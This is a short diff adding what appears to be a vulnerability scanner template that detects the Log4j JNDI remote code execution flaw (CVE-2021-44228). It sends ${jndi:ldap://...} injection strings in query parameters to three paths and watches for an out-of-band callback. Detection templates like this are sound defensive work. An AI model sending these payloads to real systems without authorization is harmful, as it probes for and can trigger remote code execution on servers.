@@ -1,0 +1,16 @@
+id: log4j-jndi-rce
+info:
+  name: Log4j JNDI RCE (CVE-2021-44228)
+  author: PhantomScan
+  severity: critical
+  description: Detects blind remote code execution in Log4j via out-of-band JNDI injection.
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?q=${jndi:ldap://{{oob_url}}}"
+      - "{{BaseURL}}/search?query=${jndi:ldap://{{oob_url}}}"
+      - "{{BaseURL}}/api/login?username=${jndi:ldap://{{oob_url}}}"
+    matchers:
+      - type: oob
+        condition: and
